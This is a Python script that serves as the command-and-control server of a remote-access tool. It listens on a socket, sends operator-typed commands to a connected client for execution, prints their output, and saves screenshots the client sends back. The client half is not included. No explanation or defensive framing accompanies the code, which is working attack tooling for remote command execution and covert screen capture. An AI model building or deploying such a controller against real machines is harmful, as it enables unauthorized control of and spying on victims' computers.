import socket
import time
import base64
import os
import io
from PIL import Image

SERVER_HOST = "10.0.10.6"
SERVER_PORT = 5003

BUFFER_SIZE = 1048576

imgcounter = 1
basename = "image%s.png"
# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# just sending a message, for demonstration purposes
message = "Hello and Welcome".encode()
client_socket.send(message)

while True:
    
    # get the command from prompt
    command = input("Enter the command you wanna execute:")
    # send the command to the client
    client_socket.send(command.encode())
    
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        print("Lost Connectino to Client: Disconnected by User")
        break
    # screenshot command
    elif command.lower() == "screenshot":
        print("Requesting Screenshot")

    # retrieve command results
    results = client_socket.recv(BUFFER_SIZE).decode()


    # When client sends image bytes
    if results.lower() == "sending image": # wait for server to verify command recieved
        imageBytes = client_socket.recv(BUFFER_SIZE) # retrieve bytes
        print("Got image data") # let user know bytes have been recieved
        image = open(basename % imgcounter, 'wb') # create new image file
        image.write(imageBytes) # write to new image file
        image.close() # close image file

# close connection to the client
client_socket.close()
# close server connection
s.close()